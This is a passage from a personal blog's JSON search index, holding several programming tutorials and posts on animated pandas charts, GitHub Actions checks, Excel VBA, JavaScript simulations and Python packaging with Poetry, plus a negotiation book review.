Generate bar chart race pivoted_df . plot_animated ( filename = 'population-over-time-bar-chart-race.gif' , n_visible = 10 , period_fmt = \"%Y\" , title = 'Top 10 Populous Countries 1800-2000' , fixed_max = True , perpendicular_bar_func = 'mean' ) What if we wanted to show a custom function for each time period. This can be achieved with defining a function and returns a dictionary on where the label should be located. Let's show the total population for each time period in the bottom left. In [ ]: def current_total ( values ): total = values . sum () s = f 'Total Population : { int ( total ) : , } ' return { 'x' : . 85 , 'y' : . 2 , 's' : s , 'ha' : 'right' , 'size' : 11 } # Generate bar chart race pivoted_df . plot_animated ( filename = 'population-over-time-bar-chart-race.gif' , n_visible = 10 , period_fmt = \"%Y\" , title = 'Top 10 Populous Countries 1800-2000' , fixed_max = True , perpendicular_bar_func = 'mean' , period_summary_func = current_total ) Line Charts Let's show the total population over time. Get the total population for each year by summing the entire row .sum(axis=1) In [4]: total_df = pivoted_df . sum ( axis = 1 ) display ( total_df ) Year 1800-01-01 6.706962e+08 1810-01-01 3.742780e+08 1820-01-01 1.013967e+09 1830-01-01 8.385709e+08 1840-01-01 8.768713e+08 1850-01-01 1.095515e+09 1860-01-01 1.005687e+09 1870-01-01 1.201439e+09 1880-01-01 1.096303e+09 1890-01-01 1.266791e+09 1900-01-01 1.382444e+09 1910-01-01 1.593107e+09 1920-01-01 1.619245e+09 1930-01-01 1.804095e+09 1940-01-01 1.994912e+09 1950-01-01 2.417460e+09 1960-01-01 2.911371e+09 1970-01-01 3.536889e+09 1980-01-01 4.245110e+09 1990-01-01 5.030435e+09 2000-01-01 5.800368e+09 dtype: float64 Now let's create an animated line chart with this data using pandas_alive . In [ ]: total_df . plot_animated ( kind = 'line' , filename = \"total-population-over-time-line.gif\" , period_fmt = \"%Y\" , title = \"Total Population Over Time\" ) Combining Both Charts Now that we've created a bar chart race & a line chart, let's combine the two charts into a single animation! Luckily, pandas_alive makes this simple, as we can pass a list of animations we'd like to combine into pandas_alive.animate_multiple_plots . In [ ]: bar_chart_race = pivoted_df . plot_animated ( n_visible = 10 , period_fmt = \"%Y\" , title = 'Top 10 Populous Countries 1800-2000' ) animated_line_chart = total_df . plot_animated ( kind = 'line' , period_label = False , title = \"Total Population Over Time\" ) pandas_alive . animate_multiple_plots ( 'population-combined-charts.gif' ,[ bar_chart_race , animated_line_chart ]) Obligatory XKCD Style Plot XKCD is an amazing comic by one of my favourite authors Randall Munro. Even better, we can style our plots in the same style of the comit with plt.xkcd() . See more at https://matplotlib.org/3.1.1/api/_as_gen/matplotlib.pyplot.xkcd.html In [8]: import matplotlib.pyplot as plt with plt . xkcd (): animated_line_chart = total_df . plot_animated ( filename = 'xkcd-line-plot.gif' , kind = 'line' , period_label = False , title = \"Total Population Over Time\" ) Generating LineChart, plotting ['0'] In [ ]:","tags":"Data Science","url":"https://jackmckew.dev/creating-animated-plots-with-pandas_alive.html","loc":"https://jackmckew.dev/creating-animated-plots-with-pandas_alive.html"},{"title":"COVID-19 Confirmed Cases NSW Australia - Animated Statistics over Time","text":"Recently, I had wanted to build a visualisation of the confirmed cases of COVID-19 in my home state NSW. This post is to cover the release of the visualisation on YouTube, and there is hopes to write future post(s) about building this visualisation & developing Pandas_Alive . Would love to hear others thoughts! Disclaimer: I am not an epidemiologist, this is a personal project not a official report; see NSW Health website for official figures https://www.health.nsw.gov.au/Infectious/covid-19/Pages/stats-nsw.aspx . Find the full animation at: The 4 charts are comprised of: Area chart (top) of new cases on a daily accuracy Line chart (bottom left) of cumulative total cases Geo scatter chart (bottom center) of new cases on a daily accuracy by the latitude/longitude of postcode Bar chart race (bottom right) of total confirmed cases per postcode This visualisation was built in Python with Pandas_Alive https://github.com/JackMcKew/pandas_alive . I set out to build this visualisation 2 weeks ago, and subsequently built Pandas_Alive to make generating animated charts from Pandas DataFrames with matplotlib as easy as df.plot_animated() . Data Source(s) COVID-19 Confirmed Cases by Postcode NSW: https://data.nsw.gov.au/data/dataset/covid-19-cases-by-location Lock down enforcement date of 01/04/2020 from: https://www.millsoakley.com.au/thinking/nsw-under-official-lockdown-full-details-of-new-government-directions-now-published/ Ruby Princess disembark date of 19/03/2020 from: https://www.theguardian.com/world/2020/mar/24/anatomy-of-a-coronavirus-disaster-how-2700-people-were-let-off-the-ruby-princess-cruise-ship-by-mistake","tags":"Data Science","url":"https://jackmckew.dev/covid-19-confirmed-cases-nsw-australia-animated-statistics-over-time.html","loc":"https://jackmckew.dev/covid-19-confirmed-cases-nsw-australia-animated-statistics-over-time.html"},{"title":"Book Review: Never Split the Difference","text":"Never Split the difference by Chris Voss & Tahl Raz is a fantastic book how handling negotiations effectively. Chris is a former hostage negotiator for the FBI involving terrorist & kidnapping situations, this book helps you gain insight into how he dealt with negotiations then, and practical examples you can use in your own life. Key Takeaways The amount of practical & insightful wisdom in this book is amazing, here I've noted down quotes from the book which make up a fantastic starting point for ensuring a negotiation goes smoothly. Prepare \"When the pressure is on, you don't rise to the occasion - you fall to your highest level of preparation\" The Goal \"Think through the best/worse case scenarios, but only write down a specific goal that represents the best case\" Summarize \"You must be able to summarize a situation in a way that your counterpart will respond with a \"That's right\", if they don't you haven't done it right\" Labels Prepare 3 to 5 labels which can be used to extract information, or diffuse an accusation \"It seems like ____ is valuable to you\" \"It seems like ____ makes it easier\" \"It seems like you're reluctant to ____\" Calibrated Questions \"Prepare 3 to 5 calibrated questions to reveal value to you and your counterpart and identify & overcome potential deal killers\" \"What are we trying to accomplish\" \"What's the core issue here\" \"What's the biggest challenge you face\" Mirroring \"Repeat the last three words (or the critical one to three words) of what someone has said. We fear what's different and are drawn to what's similar. Mirroring is the art of insinuating similarity, which facilitates bonding\" What and How \"Ask calibrated questions that begin with 'What' or 'How'. By implicitly asking the other party for help, these questions will give your counterpart an illusion of control and will inspire them to speak at length, revealing important information\" Loss Aversion \"People will take more risks to avoid a loss than to realise a gain. Make sure your counterpart sees there is something to lose by inaction\"","tags":"Book Reviews","url":"https://jackmckew.dev/book-review-never-split-the-difference.html","loc":"https://jackmckew.dev/book-review-never-split-the-difference.html"},{"title":"Managing Virtual Environments on Windows","text":"Managing virtual environments for Python on Windows was never straightforward in my experience. There is so many different tools available (which is fantastic!), it's difficult to find the right combination for Python projects. This post is for the combination of tools that work for my application, if there are any recommendations or improvements on this post, please let me know! The Tools Pyenv-win Virtualenv (interchangeable with venv ) Poetry Prior to using these tools, Anaconda was the go-to. Admittedly, the only reason to stop using was disk space. After using Anaconda on every project for a few months, around 30GB of space was being taken up for conda environments. As a lot of my projects involve using Pandas , Gooey & PyInstaller , when packaging these executables up they would come out bigger than expected (250MB vs 25MB). This is a well documented issue across the internet. The Workflow Pyenv-win Pyenv (specifically pyenv-win ), is used in this workflow to manage multiple versions of Python. To make interfacing with pyenv-win & subsequent tools, let's include system environment variables. This let's us call for the enabled Python version executable & installed packages (virtualenv, poetry, etc) from anywhere on the PC. Ensure to setup pyenv-win as per the instructions at: https://github.com/pyenv-win/pyenv-win#installation . I personally installed via the zip file method. Thank you to read Julian for raising this. Firstly, let's set up a variable of where the pyenv-win installation lives as PYENV , which I placed in C:\\Users\\%USER%\\.pyenv\\pyenv-win . Followed by a variable which will hold the current version of Python that pyenv will use as PYENV_VERSION , the value of this variable will be dependant on the installed version folder name in User/.pyenv/pyenv-win/versions/ , which is currently 3.8.1-amd64 . These are set up to use with the PATH variable, which is integrate with Windows and makes all files included in the paths listed in PATH available to anywhere on the PC. The result is: Now we need to add in new variables to the PATH variable. The two variables we want to add are %PYENV%\\versions\\%PYENV_VERSION% and %PYENV%\\versions\\%PYENV_VERSION%\\Scripts . This enables us to access both the python.exe & pip.exe of the selected version from anywhere, and then when we install packages with pip, we can access packages that have been installed. This ends up looking like: Following this, open command prompt, check that python --version matches the version variable selected, and then install packages required. The packages that I install are virtualenv & poetry . All project specific packages are installed in their own virtual environment (more on this below). Virtualenv Once virtualenv is installed and accessible from anywhere, whenever a new folder is created for a project, you can run virtualenv --prompt folder_name .env . This command will create a new virtual environment in a folder named .env, when using with VS Code, you can select this as the current environment with the Python extension. This setting lives in it's own folder .vscode/settings.json . To install new packages inside the virtual environment, either run .env/Scripts/activate.bat or open a new terminal in VS Code once selected. That's it! Poetry The use-case for Poetry is solely for packaging & distributing packages, something personally I don't do very much. To read further around packaging projects with Poetry, I've written a post at Packaging Python Packages with Poetry","tags":"Python","url":"https://jackmckew.dev/managing-virtual-environments-on-windows.html","loc":"https://jackmckew.dev/managing-virtual-environments-on-windows.html"},{"title":"Github Actions for CI/CD","text":"Recently the Python Bytes Awesome Package List moved to it's own repository from the blog post . This was done to enable the community be able to contribute their packages that they thought were awesome, which was a success with many pull requests already merged. After getting a taste of CI/CD principles with Travis CI in building this blog, an idea to integrate some CI/CD with the awesome package list repository to ensure spelling errors, broken links, etc are all checked automatically. This was a great opportunity to try out Github Actions , so then all the resources/dependencies live in one place, Github. Initially, the things to automate were: Checking the spelling Checking all the links work Perfect, this is should be a gentle introduction to Github Actions. Here is an example of how GitHub Actions can be used to automatically rebase. Source: https://github.com/marketplace/actions/automatic-rebase . Action Marketplace One amazing feature of Github Actions is that Github hosts a 'marketplace' for actions, https://github.com/marketplace?type=actions . This is awesome, because now you can just search for pre-made actions which will automate. In comparison to other CI services (let me know if there is anything similar), where you have to scour the internet looking for a post or question by someone else and piece together the action yourself. The actions I ended up using were: Check Spelling (JS, Vue, HTML, Markdown, Text) Link Checker Even better is most of the actions in marketplace come with a Usage section, which is a directly example you can copy/paste into the repository and it just works. Action Format (.yaml) A Github Action is defined with a <action_name>.yaml file which must be placed within .github/workflows from the base of the repository. As many actions as you want can be placed in this folder, and will subsequently run when triggered. The base structure of a link_checker.yaml file is: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 name : Check links on : push jobs : linkChecker : runs-on : ubuntu-latest steps : - uses : actions/checkout@v2 - name : Link Checker id : lc uses : peter-evans/link-checker@v1 with : args : -v -r * - name : Fail if there were link errors run : exit ${{ steps.lc.outputs.exit_code }} To break this down: Field Use name Name of the action on The trigger to run the action (runs whenever a push happens in this example) jobs What to run when triggered linkChecker This is a job name runs-on The operating system to run on steps Steps to take once the operating system is set up uses What action to use from the marketplace (or custom specified) The biggest part of the action, is what the trigger is. Which the documentation behind this is amazing, see this at: https://help.github.com/en/actions/reference/events-that-trigger-workflows . Actions on Pull Request The original reason for implementing CI/CD is to not only check the spelling & links in the content that the owner contributes, we also want it to run on pull requests from other users. This is captured within an issue (with solution) at: https://github.com/JackMcKew/awesome-python-bytes/issues/9 . The workflow for someone else to contribute to the repository is: Fork repository > Make changes > Submit Pull Request with changes > Check changes > Merge into repository When the action was first set up for actions to run on pull requests, it kept throwing an error: 1 The process '/usr/bin/git' failed with exit code 1 This was determined to be intentional design by Github as a mitigation against the possibility that a bad actor could open PRs against your repo and do things like list out secrets or just run up a large bill (once we start charging) on your account. After speaking with Hamel Husain from Github on Twitter, he sent some great resources in the solution he found around this: Fastpages Actions Chatops.yaml Github-Script Essentially, to take 'ownership' of the changes presented in a pull request, the owner (or authorized contributor) drops a comment with a specific command (eg, /check-pr ), which triggers an action. This workflow ended up like: PR Submitted > Owner/Contributor comments keywords (eg /check-pr ) > Action triggers > Clones PR > Runs neccessary Actions > Comments back on PR results For the Awesome Python Bytes, the action to cover this workflow ended up as ( source ): Ensure to use if: steps.prcomm.outputs.BOOL_TRIGGERED == 'true' in all subsequent jobs you want triggered if the phrase is found, otherwise the action will become recursive: check for comment, run checks, make a comment, check for comment, etc 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 name : Trigger Checks on Fork on : [ issue_comment ] jobs : label-pr : runs-on : ubuntu-latest steps : - name : listen for PR Comments uses : machine-learning-apps/actions-chatops@master with : APP_PEM : ${{ secrets.APP_PEM }} APP_ID : ${{ secrets.APP_ID }} TRIGGER_PHRASE : \"/check-pr\" env : # you must supply GITHUB_TOKEN GITHUB_TOKEN : ${{ secrets.manual_github_token }} id : prcomm # This step clones the branch of the PR associated with the triggering phrase, but only if it is triggered. - name : clone branch of PR if : steps.prcomm.outputs.BOOL_TRIGGERED == 'true' uses : actions/checkout@master with : ref : ${{ steps.prcomm.outputs.SHA }} # This step is a toy example that illustrates how you can use outputs from the pr-command action - name : print variables if : steps.prcomm.outputs.BOOL_TRIGGERED == 'true' run : echo \"${USERNAME} made a triggering comment on PR# ${PR_NUMBER} for ${BRANCH_NAME}\" env : BRANCH_NAME : ${{ steps.prcomm.outputs.BRANCH_NAME }} PR_NUMBER : ${{ steps.prcomm.outputs.PULL_REQUEST_NUMBER }} USERNAME : ${{ steps.prcomm.outputs.COMMENTER_USERNAME }} - name : Check Spelling if : steps.prcomm.outputs.BOOL_TRIGGERED == 'true' uses : UnicornGlobal/spellcheck-github-actions@master - name : Link Checker if : steps.prcomm.outputs.BOOL_TRIGGERED == 'true' id : lc uses : peter-evans/link-checker@v1 with : args : -v -r * - name : Fail if there were link errors run : exit ${{ steps.lc.outputs.exit_code }} - name : Comment on PR if checks pass if : success() && steps.prcomm.outputs.BOOL_TRIGGERED == 'true' uses : actions/github-script@0.9.0 with : github-token : ${{secrets.manual_github_token}} script : | github.issues.createComment({ issue_number: context.issue.number, owner: context.repo.owner, repo: context.repo.repo, body: 'ðŸ‘‹ All checks passed!' }) - name : Comment on PR if checks fail if : failure() && steps.prcomm.outputs.BOOL_TRIGGERED == 'true' uses : actions/github-script@0.9.0 with : github-token : ${{secrets.manual_github_token}} script : | github.issues.createComment({ issue_number: context.issue.number, owner: context.repo.owner, repo: context.repo.repo, body: 'Some checks failled :(, check Github Actions for more details.' })","tags":"Software","url":"https://jackmckew.dev/github-actions-for-cicd.html","loc":"https://jackmckew.dev/github-actions-for-cicd.html"},{"title":"Find Nth Visible Cell with VBA - Excel","text":"Excel is the undisputed leader in the spreadsheet world, with over 750 million users worldwide. It is a household name when it comes to analyzing data, so personally I find myself in Excel for most of the work I do. One powerful option that in my experience is underused is formatting as table, this enables users to filter, create slicers, create data links, summarize as pivot tables and more. One sore point that I've faced in the past is being able to retrieve the first 5 results of the table after filtering, as index-match, vlookup, etc still search within the entire data space of the table, whether the cells are visible or not. Today, let's go through how to create a function in VBA that anyone in the spreadsheet can access to return the nth visible cell in the table (filtered or not). Working Example I always love to see what something does & how I could use it before learning how to do it, so here is a GIF of this function in action. Application : If you wanted to get the top 5 results after filtering, you can use this function and change the row index to be 1 through to 5. The function searches in: Sheet Name = Data Table Table Name = Table1 Row Index = 1 (first visible row) Column Index = 3 (Rep) You should see cell I2 changing to be whatever the first Rep value visible is. Example Source File Here is the source file used to create the GIF above, with code already included, just make sure to enable macros. Nth Visible Cell Excel Workbook Create a Source Data Table After googling 'Sample Excel Data', let's just use this data set to built & test our function: https://www.contextures.com/xlSampleData01.html A sample of this data set is: OrderDate Region Rep Item Units UnitCost Total 1/06/2019 East Jones Pencil 95 1.99 189.05 1/23/2019 Central Kivell Binder 50 19.99 999.5 2/09/2019 Central Jardine Pencil 36 4.99 179.64 2/26/2019 Central Gill Pen 27 19.99 539.73 3/15/2019 West Sorvino Pencil 56 2.99 167.44 Once we've formatted the data source as a table in excel, this should result in: Enable Developer Mode / Macros This post won't go into how to enable Developer mode/tab, there is many resources on the web for this, such as: https://support.office.com/en-us/article/show-the-developer-tab-e1192344-5e56-4d45-931b-e5fd9bea2d45 Function to Find Visible Row After researching the internet when I came across this problem, I stumbled across a similar question on Stackoverflow: https://stackoverflow.com/questions/58381445/how-to-get-value-of-visible-cell-in-a-table-after-filtering-only-working-for-1 With one of the answers from Chris Neilsen being: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 Function FindNthVisibleRow ( lo As ListObject , Idx As Long ) As ListRow 'The function takes in the Table as a ListObject (lo), and desired row index (Idx) and returns a ListRow Dim RwCnt As Long Dim lr As ListRow ' Return an error if the desired row index is less than 0 If Idx <= 0 Then Exit Function 'Loop through each row in the table For Each lr In lo.ListRows ' Check if the row is not hidden ( not filtered out ) If lr . Range . EntireRow . Hidden = False Then 'Increment current number of rows found RwCnt = RwCnt + 1 ' If the current row number matches index , return row ( ListRow ) If Idx = RwCnt Then Set FindNthVisibleRow = lr Exit For End If End If Next End Function Fantastic, now we've got a function to locate the row, now we can make another function to determine the cell index and return the desired cell value. How to Create Functions Once you have the Developer tab open, select Visual Basic button on the left hand side. This will present you with a window like: Now, to create a space we're our functions will live, we need to insert a module: This is we're our functions live, copy & paste the above and you'll have made a function! Function for Visible Cell To interface with the above FindNthVisibleRow function, we need 3 new variables: sheetName - The name of the sheet where the table lives. (This is only necessary if you have multiple tables spread across many sheets, as afaik VBA only selects table Objects through the worksheet object) tableName - The name of the table to return data from iRow - The row index we want to return iCol - The column index we want to return Without further ado, here is the function. Note that another function GetListObject is used to find the table in question see GetListObject Function for more information on this. Otherwise you can use Application.Worksheets(sheetName) . 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 Function FindNthVisibleCell ( sheetName As String , tableName As String , iRow As Long , iCol As Long ) Application . Volatile True 'This is set to True so the cell recalculates on changes Dim lo As ListObject Dim rng As Range Dim address As String Dim cellVal As Variant ' GetListObject returns the desired Table object from sheetName & tableName Set lo = GetListObject ( tableName , Sheets ( sheetName )) 'Get the address of the visible Row we want to look in address = FindNthVisibleRow(lo, iRow).Range.address ' Set the desired visible row with address Set rng = Worksheets ( sheetName ). Range ( address ) ' Return the cell at the desired column index FindNthVisibleCell = rng . Cells ( 1 , iCol ). Value End Function GetListObject Function Similarly, the GetListObject function was also found on Stackoverflow, by the user AndrewD : https://stackoverflow.com/questions/18030637/how-do-i-reference-tables-in-excel-using-vba 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 Public Function GetListObject ( ByVal ListObjectName As String , Optional ParentWorksheet As Worksheet = Nothing ) As Excel . ListObject ' Source https://stackoverflow.com/questions/18030637/how-do-i-reference-tables-in-excel-using-vba On Error Resume Next If (Not ParentWorksheet Is Nothing) Then Set GetListObject = ParentWorksheet.ListObjects(ListObjectName) Else Set GetListObject = Application.Range(ListObjectName).ListObject End If On Error GoTo 0 ' Or your error handler If ( Not GetListObject Is Nothing ) Then 'Success ElseIf (Not ParentWorksheet Is Nothing) Then Call Err.Raise(1004, ThisWorkbook.Name, \"ListObject ' \" & ListObjectName & \" ' not found on sheet ' \" & ParentWorksheet.Name & \" '!\") Else Call Err.Raise(1004, ThisWorkbook.Name, \"ListObject ' \" & ListObjectName & \" ' not found ! \" ) End If End Function","tags":"Excel","url":"https://jackmckew.dev/find-nth-visible-cell-with-vba-excel.html","loc":"https://jackmckew.dev/find-nth-visible-cell-with-vba-excel.html"},{"title":"Simulate Virus Outbreak with Javascript","text":"This post will and simulate how viruses can spread throughout a community and implement a variety of different parameters to see how these affect the simulation. This is following on from last week's post on how to do a bouncing ball simulation with the canvas API https://jackmckew.dev/pelican-and-javascript-bouncing-balls-in-canvas.html . Below is a GIF for sharing on social media, see below for interactive visualisation. I am not an epidemiologist by any means of the word, this is entirely out of interest. Firstly, the extensions that are implemented on top of the bouncing ball simulation are: GUI controls for operating the simulation Area chart using Canvas API to show percentage of population healthy/infected/recovered. When a red ball hits a blue ball it'll attempt to transmit Following a specified period of time, the red ball will turn purple and will no longer transmit to other balls The controllable elements of the simulation below are: Speed of balls Size (radius) of balls Number of balls allowed to move at any point in time Simulate the effect of a lock down in the midst of outbreak Chance to transmit Great for showing the effects of viruses if there is only a chance to transmit between population. Respirators are normally named after their filter efficiency (eg, N95 is 95% efficient at collecting a specific size particle). If you set the chance to transmit 5 (95% chance to block) then you'll simulate if everyone in a population wore a mask. Time to recover Simulate if a virus took a different amount of time before recovering Try the simulation out below and please comment any setting combinations you found interesting or if you have any more interesting parameters to simulate! The simulation depends on the size of the screen that you are looking at on this post, change some variables to see the impact! Javascript Source(s): virus_part_1.js dat.gui.js CSS Source(s): virus_part_1.css","tags":"Javascript","url":"https://jackmckew.dev/simulate-virus-outbreak-with-javascript.html","loc":"https://jackmckew.dev/simulate-virus-outbreak-with-javascript.html"},{"title":"Pelican and Javascript - Bouncing Balls in Canvas","text":"Today let's look into building a visualisation of some bouncing balls with Javascript. The inspiration for building this comes from Harry Stevens over at the Washington Post for his amazing piece of data journalism around the coronavirus . Here is a gif of the current version of my bouncing balls using the Canvas API: As soon as I read that article personally, I thought of a few ways to extend the analysis, and such this post was born. A few of the ideas that I've had are: Adding a 'chance' to transmit the infection (eg, 50% of all collisions transmit). This could be a symbolic way of seeing how much of an impact wearing PPE makes on virus outbreaks. Having hot spots in which the circles will be attracted towards. If you've got any ideas of some new parameters that might be interesting to see, leave a comment! Before I could build a similar visualisation, I had to figure out how I could integrate Javascript into this blog. Luckily, the amazing community behind Pelican has built a plethora of plugins to choose from. Pelican Javascript ended up being the plugin of choice. By using this in combination with Pelican Autostatic , this allowed for the article-centric resources and also ensures that a list of source javascript files was included at the end of each post. Without further ado, here is my current implementation of bouncing balls. There is a few bugs in that sometimes they fly out of the box and some get stuck together forever, if anyone has any ideas on how I could fix it, please let me know in the comments! This visualisation is completed using the Canvas API . To interface with the canvas element in HTML, we use the DOM . Another option of doing this is using d3js , for which my understanding is that since Canvas is inbuilt, it is much more powerful at painting more objects. We then instantiate an amount of objects (which will be the balls) within Javascript with the following parameters: radius angle speed colour position These are then all pushed into an array for which we will loop through checking collision with horizontal walls, vertical walls and the other balls. To have a visualisation which moves along with time, we can use the setInterval method (which is apart of the Window object aka the browser). We will be painting the canvas at each interval that we have set with this method. Now we need to paint our canvas with the balls. To do this, we start by clearing the canvas each time, so the last 'timestamp' doesn't stay on our canvas (unless you want to?). The balls are then painted onto the canvas using the canvas arc() Method . At each time step, we need to do a series of steps: Clear the canvas (using canvas clearRect() Method ). The following steps are applied to each individual ball. Check if the ball is colliding with the walls or another ball. If they are, reflect them accordingly. (Since our balls are all the same 'weight', we use a mass elastic collision , which means both balls angle will be rotated by 90 degrees. Move our ball according to the angle it is facing, by it's speed. Paint the ball on canvas. Repeat for all balls. Javascript Source(s): Bouncing_Balls.js","tags":"Javascript","url":"https://jackmckew.dev/pelican-and-javascript-bouncing-balls-in-canvas.html","loc":"https://jackmckew.dev/pelican-and-javascript-bouncing-balls-in-canvas.html"},{"title":"Packaging Python Packages with Poetry","text":"Packaging Python code to easily share code with others! Building upon a previous post on \"How many words have I written in this blog?\" , let's dive into how to share this code with other on PyPI and integrate into this website with a 'word ticker' which updates whenever a new post is uploaded. What is Poetry Package Structure __init__.py Files Wordsum - My First Package Wordsum Package Structure User Interaction Publishing to PyPI Integrating Wordsum Into This Website Update requirements.txt Update pelicanconf.py Update base.html If you are using Python, you've most likely used pip, conda or similar to install packages from other developers such that you aren't reinventing the wheel. This functionality is by far one of my favourite features of the language. If you aren't already aware, (most) of these packages you install with pip live on PyPI , the Python Package Index. This post is for how to structure a package in Python with Poetry and publish it on PyPI (I was amazed how easy this was). What is Poetry A quote from the creator of Poetry : I built Poetry because I wanted a single tool to manage my Python projects from start to finish. I wanted something reliable and intuitive that the community could use and enjoy. - SÃ©bastien Eustace In it's essence, Poetry manages the Python project workflow so you don't have to. Same as venv, virtualenv, conda create virtual environments for a project, Poetry will also create a virtual environment to go with your project. If you are working in VS Code, the Python extension doesn't automatically detect the virtual environment location that Poetry defaults to. To tell VS Code where the virtual environments live for Poetry head to Settings > python.venvFolders and add C:\\\\Users\\\\USERNAME\\\\AppData\\\\Local\\\\pypoetry\\\\Cache\\\\virtualenvs for Windows. Package Structure Python packages require a standard structure (albeit lenient), which Poetry sets up for you when a project is initialized. If we run poetry new test_package we will end up with the structure: 1 2 3 4 5 6 7 8 test-package +-- pyproject.toml +-- README.rst +-- test_package | +-- __init__.py +-- tests | +-- __init__.py | +-- test_test_package.py Inside the top directory of our package we have 2 folders and 2 files. File Use pyproject.toml Contains all the information about your package, dependancies, versions, etc. README.rst Readme file as to what the project does, any instructions of use, etc (see Pandas-Bokeh for a great example). test_package This is where all our Python code will live for the project. tests Following test driven development, this is where any automated tests live to make sure the code runs as expected. __init__.py Files What are all these __init__.py files and what are they there for? To be able to import code from another folder, Python requires to see an __init__.py inside a folder to mark it as a package. If we create a function inside our test_package folder: 1 2 3 +-- test_package | +-- __init__.py | +-- function .py Now users can use: import test_package.function or from test_package import function Wordsum - My First Package If you have read this blog previously, I did a post on answering the question \"How many words have I written in this blog?\" which you can reach at: https://jackmckew.dev/counting-words-with-python.html . This was great, I had wrote 2 functions which count how many words were inside markdown files & Jupyter notebooks. Following this, I had a great idea, why not make a 'ticker' of how many words have been written in this blog and display this on the website. Making sure that whenever a new post is added the 'word ticker' increments by how many words were in that post. This in the inspiration behind Wordsum which is also available on PyPI . Meaning you can install it with: 1 pip install wordsum Wordsum Package Structure To make the two functions more extensible, the two functions were further broken into smaller functions and contained in their own 'internal' package (folder). The basic structure we ended up with was: 1 2 3 4 5 6 7 8 9 10 11 12 13 wordsum +-- word_sum.py +-- __init__.py +-- _file_types | +-- __init__.py | +-- jupyter.py | +-- markdown.py +-- _io | +-- __init__.py | +-- read_files.py +-- _util | +-- __init__.py | +-- file_locate.py Now the _ prefix to the folders is to nominate that functions contained in these folders are internal to the package. Meaning the user shouldn't be able to access these functions. The main functions of the package are kept within word_sum.py (which uses the functions in the _xxx folders). User Interaction To make the main functions within word_sum.py accessible to users of the package we can import them in the 'top' __init__.py of the wordsum package. 1 2 3 4 5 __version__ = '0.1.3' from wordsum.word_sum import count_words from wordsum.word_sum import list_supported_formats from wordsum.word_sum import count_files This will allow users to interact with the package like: 1 2 3 4 5 import wordsum if __name__ == \"__main__\" : print ( wordsum . count_words ( './example_files' ,[ '.md' , '.ipynb' ])) wordsum . list_supported_formats () Publishing to PyPI Since we've used Poetry with the development of this package, our pyproject.toml should be a bit more fleshed out. Wordsum's pyproject.toml ended up as: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 [tool.poetry] name = \"wordsum\" version = \"0.1.3\" description = \"Counting words within a folder of files recursively.\" readme = \"README.md\" repository = \"https://github.com/JackMcKew/wordsum\" authors = [\"JackMcKew <jackmckew2@gmail.com>\"] [tool.poetry.dependencies] python = \"&#94;3.6\" mypy = \"&#94;0.770\" nbformat = \"&#94;5.0.4\" black = \"&#94;19.10b0\" flake8 = \"&#94;3.7.9\" [tool.poetry.dev-dependencies] pytest = \"&#94;5.2\" black = {version = \"&#94;19.10b0\", allow-prereleases = true} [tool.poetry.urls] issues = \"https://github.com/JackMcKew/wordsum/issues\" [build-system] requires = [\"poetry>=0.12\"] build-backend = \"poetry.masonry.api\" All that is left to do is to sign up for an account on PyPI and run: 1 poetry publish This will ask for your PyPI credentials, build the package (a step done by setuptools previously) and upload the package for you. Now users can install your package with: 1 pip install wordsum Integrating Wordsum Into This Website Previously I've written a blog post on how I moved from Wordpress to Pelican ( https://jackmckew.dev/migrating-from-wordpress-to-pelican.html ). This goes into detail about how this site utilizes a continuous integration (CI) service (TravisCI), that rebuilds the site each time a new file is pushed to the GitHub repository. Following this, Netlify fires up and pushes the freshly built website out to the internet. This site uses the theme Flex as a basis, except a local 'fork' of Flex is retained in the repository such that I can make edit without disrupting other users of Flex. So there was only 3 files that I needed to edit: pelicanconf.py , requirements.txt and a html file for the theme. pelicanconf.py contains all the instructions to provide to pelican when building the site, requirements.txt contains the list of packages required for TravisCI to use and the template html file is how it is to represented on the web. Update requirements.txt First off we add wordsum to the virtual environment for the project and freeze it within requirements.txt with 1 2 pip install wordsum pip freeze requirements.txt Since most CI services use Ubuntu as a base, pywin32 is installed be default as a dependancy on wordsum, this can be removed with pip uninstall pywin32 Update pelicanconf.py This file contains the code that will run when pelican content is called upon the folder to build this website. To interface with wordsum we add the code: 1 2 3 4 import wordsum WORD_TICKER = wordsum . count_words ( './content' ,[ '.md' , '.ipynb' ]) WORD_TICKER = f \" { WORD_TICKER : , } \" This creates a variable WORD_TICKER that can be used later on to show the number of words counted across all markdown files & Jupyter notebooks. The line WORD_TICKER = f\"{WORD_TICKER:,}\" adds thousand separators to numbers in Python with f-strings. For example this converts 123456 to 123,456. Update base.html Now we just need to show our word ticker on the website. In the Flex theme, all pages inherit from a base.html file. To squeeze our new metrics onto the page we add the lines: 1 2 3 4 {% if WORD_TICKER %} < p > Number of Posts: {{ articles|count }} </ p > < p > Number of Words: {{ WORD_TICKER}} </ p > {% endif %} First we check if the variable WORD_TICKER is used to ensure we only include the metrics if the variable has been set. Followed by two paragraph markers which will show: How many posts are on the website How many words are used in all of those posts","tags":"Python","url":"https://jackmckew.dev/packaging-python-packages-with-poetry.html","loc":"https://jackmckew.dev/packaging-python-packages-with-poetry.html"},{"title":"Counting Words with Python","text":"Recursively counting words in markdown within a folder In the last 55 posts, I've written 34846 words in this blog. In comparison, my engineering thesis for graduating university was 9916 words across 69 pages. A question had popped into my mind this week, \"How many words have I written in this blog?\". As per normal, we'll go into how to use Python to solve this problem. This is an opportunity to get more familiar with pathlib , a renowned, enjoyable way to handle pathing within Python programs. In [1]: import os import re import pathlib import io from typing import List A great way to start projects, is to see if it's already been done before. @gandreadis over at GitHub had already tackled this problem on the single file basis: https://github.com/gandreadis/markdown-word-count . This means all we need to do is: Recursively loop through a folder and find all the markdown files Call @gandreadis 's function to get the count of words for each file Sum total words First of let's bring @gandreadis function into our program. It's been modified slightly to take in a file path, read the file contents in a variable, clean up contents and return the length of an array split by spaces. For example if the sentence (string) is 'How many words have I written in this blog?', when .split is called this returns an array of each word split by a space. Allowing us to calculate how many words, by counting the number of elements in the array. 